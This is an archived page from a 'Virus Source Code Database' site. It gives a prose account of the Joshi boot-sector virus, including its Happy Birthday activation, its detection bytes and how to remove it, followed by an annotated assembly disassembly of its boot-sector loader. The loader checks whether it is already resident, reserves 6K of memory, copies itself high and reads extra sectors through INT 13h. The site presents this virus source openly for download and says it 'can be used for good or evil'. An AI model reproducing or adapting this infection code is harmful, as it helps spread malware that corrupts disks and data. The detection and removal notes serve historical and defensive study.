<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: joshi__asm</title>
<meta name="KEYWORDS" content="joshi_.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for joshi_.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="j_1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_1808_asm.php">j_1808_asm</a><br>
<a href="j-1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-1808_asm.php">j-1808_asm</a><br>
<a href="j_a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_a204_asm.php">j_a204_asm</a><br>
<a href="j-a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-a204_asm.php">j-a204_asm</a><br>
<a href="jackal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jackal_asm.php">jackal_asm</a><br>
<a href="jap-xmas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jap-xmas_asm.php">jap-xmas_asm</a><br>
<a href="jasmine_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jasmine_asm.php">jasmine_asm</a><br>
<a href="jaws26k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws26k_asm.php">jaws26k_asm</a><br>
<a href="jaws528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws528_asm.php">jaws528_asm</a><br>
<a href="je_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/je_asm.php">je_asm</a><br>
<a href="jeru_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_asm.php">jeru_asm</a><br>
<a href="jerubc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerubc_asm.php">jerubc_asm</a><br>
<a href="jerube_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerube_asm.php">jerube_asm</a><br>
<a href="jeru_dc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_dc_asm.php">jeru_dc_asm</a><br>
<a href="jerufcen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerufcen_asm.php">jerufcen_asm</a><br>
<a href="jeru_fre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_fre_asm.php">jeru_fre_asm</a><br>
<a href="jeru_o_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_o_asm.php">jeru_o_asm</a><br>
<a href="jerusale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusale_asm.php">jerusale_asm</a><br>
<a href="jerusalm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusalm_asm.php">jerusalm_asm</a><br>
<a href="jerus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerus_asm.php">jerus_asm</a><br>
<a href="jeruslm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruslm_asm.php">jeruslm_asm</a><br>
<a href="jeruzal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruzal_asm.php">jeruzal_asm</a><br>
<a href="jeruz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruz_asm.php">jeruz_asm</a><br>
<a href="jesus__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus__asm.php">jesus__asm</a><br>
<a href="jesus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus_asm.php">jesus_asm</a><br>
<a href="jfk3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jfk3_asm.php">jfk3_asm</a><br>
<a href="jo1_11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo1_11_asm.php">jo1_11_asm</a><br>
<a href="joana111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joana111_asm.php">joana111_asm</a><br>
<a href="john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/john_asm.php">john_asm</a><br>
<a href="johngalt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/johngalt_asm.php">johngalt_asm</a><br>
<a href="joker_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_3_asm.php">joker_3_asm</a><br>
<a href="joker_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_asm.php">joker_asm</a><br>
<a href="jokr1602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jokr1602_asm.php">jokr1602_asm</a><br>
<a href="joshext_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshext_asm.php">joshext_asm</a><br>
<a href="joshi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi__asm.php">joshi__asm</a><br>
<a href="joshi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi_asm.php">joshi_asm</a><br>
<a href="joshua_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshua_asm.php">joshua_asm</a><br>
<a href="jo_v111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo_v111_asm.php">jo_v111_asm</a><br>
<a href="j_sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_sundyb_asm.php">j_sundyb_asm</a><br>
<a href="j-sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-sundyb_asm.php">j-sundyb_asm</a><br>
<a href="jump4joy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jump4joy_asm.php">jump4joy_asm</a><br>
<a href="justice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/justice_asm.php">justice_asm</a><br>
<a href="jw2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jw2_asm.php">jw2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

       The Joshi Virus was isolated in India in June 1990.  At the time it was 
       isolated, it was reported to be widespread in India as well as 
       portions of the continent of Africa.  Joshi is a memory resident 
       boot sector infector of 5.25" diskettes.  It will also infect 
       hard disks, though in the case of hard disks it infects the partition 
       table or master boot sector rather than the boot sector (sector 0). 
 
       After a system has been booted from a Joshi-infected diskette, the 
       virus will be resident in memory.  Joshi takes up approximately 
       6K of system memory, and infected systems will show that total 
       system memory is 6K less than is installed if the DOS CHKDSK program 
       is run. 
 
       Joshi has some similarities to two other boot sector infectors. 
       Like the Stoned virus, it infects the partition table of hard disks. 
       Similar to the Brain virus's method of redirecting all attempts to 
       read the boot sector to the original boot sector, Joshi does this with 
       the partition table. 
 
       On January 5th of any year, the Joshi virus activates.  At that 
       time, the virus will hang the system while displaying the message: 
 
             "type Happy Birthday Joshi" 
 
       If the system user then types "Happy Birthday Joshi", the system 
       will again be usable. 
 
       This virus may be recognized on infected systems by powering off 
       the system and then booting from a known-clean write-protected 
       DOS diskette.  Using a sector editor or viewer to look at the 
       boot sector of suspect diskettes, if the first two bytes of the 
       boot sector are hex EB 1F, then the disk is infected.  The EB 1F 
       is a jump instruction to the rest of the viral  code. The remainder 
       of the virus is stored on track 41, sectors 1 thru 5 on 360K 
       5.25 inch Diskettes.  For 1.2M 5.25 inch diskettes, the viral code 
       is located at track 81, sectors 1 thru 5. 
 
       To determine if a system's hard disk is infected, you must look at 
       the hard disk's partition table.  If the first two bytes of the 
       partition table are EB 1F hex, then the hard disk is infected.  The 
       remainder of the virus can be found at track 0, sectors 2 thru 6. 
       The original partition table will be a track 0, sector 9. 
 
       The Joshi virus can be removed from an infected system by first 
       powering off the system, and then booting from a known-clean, write- 
       protected master DOS diskette.  If the system has a hard disk, the 
       hard disk should have data and program files backed up, and the 
       disk must be low-level formatted.  As of July 15, 1990, there are 
       no known utilities which can disinfect the partition table of the 
       hard disk when it is infected with Joshi.  Diskettes are easier to 
       remove Joshi from, the DOS SYS command can be used, or a program 
       such as MDisk from McAfee Associates, though this will leave the 
       viral code in an inexecutable state on track 41. 


; File: JOSHI.BIN
; File Type: BIN
; Processor: 8086/88
; Range: 06000h to 061ffh
; Subroutines:    0
 
.RADIX 16
 
dseg0000        SEGMENT at 00000 
dseg0000        ENDS
 
sseg            SEGMENT para stack 
sseg            ENDS
 
dsegb800        SEGMENT at 0B800 
dsegb800        ENDS
 
                ORG     00H
sseg            SEGMENT para stack 
                ASSUME CS:sseg
o06000          PROC NEAR
;<es = 0600>
;<cs = 0600>
;<ss = 0600>
;<ds = 0600>
                JMP     SHORT START             ;06000 >>xref=<06021><<
                                                ;    ;*
                NOP                             ;06002 
;-----------------------------------------------------
                DB      4DH,53,44,4F,53,35      ;06003 MSDOS5
                DB      2E,30,00,02,02,01       ;06009 .0....
                DB      00,02,70,00,0D0,02      ;0600F ..p...
                DB      0FDH,02,00,09,00,02     ;06015 ......
                DB      00,00,00,28,01,00       ;0601B ...(..
;-----------------------------------------------------
START:          CLI                             ;06021 *
                                                ;     Turn OFF Interrupts
                MOV     AX,CS                   ;06022 
                MOV     DS,AX                   ;06024 ds=cs=ss=0
                MOV     SS,AX                   ;06026 
                MOV     SP,0F000H               ;06028 
                STI                             ;0602B Turn ON Interrupts
                ASSUME DS:sseg
                MOV     AX,WORD PTR DS:d06413   ;0602C Get memory size in 
                                                ;     1K blocks
                MOV     CL,06                   ;0602F 
                SHL     AX,CL                   ;06031 Multiply by 2's
                MOV     ES,AX                   ;06033 Make a segment out 
                                                ;     of it
                MOV     AX,0200H                ;06035 
                SUB     AX,0021H                ;06038 
                MOV     DI,0000H                ;0603B 
                MOV     SI,7C00H                ;0603E 
                ADD     SI,AX                   ;06041 Check to see if viru-
                                                ;     s already
                ADD     DI,AX                   ;06043 Installed
                MOV     CX,0179H                ;06045 
                SUB     CX,AX                   ;06048 
                CLD                             ;0604A Forward String Opers
                REPZ    CMPSB                   ;0604B Flgs=DS:[SI]-ES:[DI]
                JNE     NOT_INSTALLED           ;0604D >>xref=<0605f><<
                                                ;    ;*
                                                ;     Jump not equal(ZF=0)
                MOV     AX,ES                   ;0604F If installed, go 
                                                ;     jump to virus
                ADD     AX,0020H                ;06051 
                MOV     ES,AX                   ;06054 
                MOV     BX,0000H                ;06056 
                PUSH    ES                      ;06059 
                PUSH    BX                      ;0605A 
                MOV     AX,0001H                ;0605B 
                RETF                            ;0605E 
;-----------------------------------------------------
NOT_INSTALLED:  MOV     AX,WORD PTR DS:d06413   ;0605F *
                                                ;     Get memory size
                SUB     AX,0006H                ;06062 Reserve 6K bytes 
                                                ;     for virus
                MOV     WORD PTR DS:d06413,AX   ;06065 Save memory size
                MOV     CL,06                   ;06068 
                SHL     AX,CL                   ;0606A Multiply by 2's
                                                ;     Make segment out of 
                                                ;     new size
                MOV     ES,AX                   ;0606C ES points to virus 
                                                ;     area
                MOV     SI,7C00H                ;0606E 
                MOV     DI,0000H                ;06071 Move virus to high 
                                                ;     memory
                MOV     CX,0200H                ;06074 above where DOS resi-
                                                ;     des
                CLD                             ;06077 Forward String Opers
                REP     MOVSB                   ;06078 Mov DS:[SI]->ES:[DI]
                MOV     AX,ES                   ;0607A Increment ES for 
                                                ;     next sector
                ADD     AX,0020H                ;0607C 
                MOV     ES,AX                   ;0607F 
                MOV     BX,0000H                ;06081 
                PUSH    ES                      ;06084 
                PUSH    BX                      ;06085 
                PUSH    CS                      ;06086 
                POP     DS                      ;06087 ds=cs
                MOV     AH,02                   ;06088 read one sector
                MOV     AL,01                   ;0608A 
                MOV     CH,BYTE PTR DS:d0dc1e   ;0608C Get cylinder (28H 
                                                ;     Here)
                MOV     CL,BYTE PTR DS:d0dc1f   ;06090 Get sector (1 here)
                MOV     DH,00                   ;06094 Get head number
                MOV     DL,BYTE PTR DS:d0dc20   ;06096 Get drive number 
                                                ;     (0 here)
                PUSH    AX                      ;0609A 
                MOV     AX,SEG dsegb800 ;abs    ;0609B >>xref=<b8000><<
                                                ;    ;AT 0b800
;<ds = b800>
                MOV     DS,AX                   ;0609E ds = video segment
                POP     AX                      ;060A0 
READ_DISK:      PUSH    AX                      ;060A1 *
                PUSH    BX                      ;060A2 
                PUSH    CX                      ;060A3 
                PUSH    DX                      ;060A4 
                PUSH    ES                      ;060A5 
                INT     13H                     ;060A6 DSK:02-read sector, 
                                                ;     into ES:BX
                POP     ES                      ;060A8 
                POP     DX                      ;060A9 
                POP     CX                      ;060AA 
                POP     BX                      ;060AB 
                POP     AX                      ;060AC 
                JNB     READ_OK                 ;060AD >>xref=<060bf><<
                                                ;    ;*
                                                ;     Jump if >= (no sign)
                                                ;     Jump if no error
                PUSH    AX                      ;060AF Else handle an error
                PUSH    BX                      ;060B0 Reading the disk
                PUSH    CX                      ;060B1 
                PUSH    DX                      ;060B2 
                PUSH    ES                      ;060B3 
                MOV     AH,00                   ;060B4 
                INT     13H                     ;060B6 DSK:00-reset, DL=dri-
                                                ;     ve
                POP     ES                      ;060B8 
                POP     DX                      ;060B9 
                POP     CX                      ;060BA 
                POP     BX                      ;060BB 
                POP     AX                      ;060BC 
                JMP     SHORT READ_DISK         ;060BD >>xref=<060a1><<
                                                ;    ;*
READ_OK:        INC     CL                      ;060BF *
                                                ;     Next sector
                ADD     BX,0200H                ;060C1 increment buffer
                PUSH    DS                      ;060C5 save ds video pointe-
                                                ;     r
                PUSH    CS                      ;060C6 
;<ds = 0600>
                POP     DS                      ;060C7 ds=cs
                PUSH    AX                      ;060C8 
                MOV     AL,CL                   ;060C9 
                SUB     AL,BYTE PTR DS:d0dc1f   ;060CB 
                SUB     AL,08                   ;060CF is al> start sector 
                                                ;     + 8
                POP     AX                      ;060D1 
;<ds = b800>
                POP     DS                      ;060D2 restore ds video 
                                                ;     pointer
                JB      READ_DISK               ;060D3 >>xref=<060a1><<
                                                ;    ;*
                                                ;     Jump if <  (no sign)
                                                ;     If al< from above, 
                                                ;     go read again
                MOV     AX,0000H                ;060D5 
;<ds = 0600>
                RETF                            ;060D8 Just return to anywh-
                                                ;     ere!!
;-----------------------------------------------------
                DB      157D DUP (00H)          ;060D9 (.)
                                                ;     Unused data
;-----------------------------------------------------
b06176:         ADD     BYTE PTR [BX+SI],AL     ;06176 
                ADD     BYTE PTR [SI-5DH],BH    ;06178 
                DEC     BP                      ;0617B 
                JL      b06176                  ;0617C Jump if <  (w/ sign)
                RETN                            ;0617E 
;-----------------------------------------------------
                STC                             ;0617F 
                RETN                            ;06180 
;-----------------------------------------------------
                MOV     AH,02                   ;06181 
                MOV     DX,WORD PTR DS:d0dc4d   ;06183 
                MOV     CL,06                   ;06187 
                SHL     DH,CL                   ;06189 Multiply by 2's
                OR      DH,BYTE PTR DS:d0dc4f   ;0618B 
                MOV     CX,DX                   ;0618F 
                XCHG    CH,CL                   ;06191 
                MOV     DL,BYTE PTR DS:d0dc24   ;06193 
                MOV     DH,BYTE PTR DS:d0dc25   ;06197 
                INT     13H                     ;0619B DSK:02-read sector, 
                                                ;     into ES:BX
                RETN                            ;0619D 
;-----------------------------------------------------
                DB      0DH,0A                  ;0619E ..
                DB      'Non-System disk or di' ;061A0 
                DB      'sk error'              ;061B5 
                DB      0DH,0A                  ;061BD ..
                DB      'Replace and press any' ;061BF 
                DB      ' key when ready'       ;061D4 
                DB      0DH,0A,00               ;061E3 ...
                DB      'IO      SYSMSDOS   SY' ;061E6 
                DB      'S'                     ;061FB 
                DB      00,00                   ;061FC ..
                DB      55,0AA                  ;061FE U.
o06000          ENDP
 
sseg            ENDS
 
d06413          EQU     00413H 
d0dc1e          EQU     07C1EH 
d0dc1f          EQU     07C1FH 
d0dc20          EQU     07C20H 
d0dc24          EQU     07C24H 
d0dc25          EQU     07C25H 
d0dc4d          EQU     07C4DH 
d0dc4f          EQU     07C4FH 
                END     o06000
 

</textarea></td></tr></table></body></html>
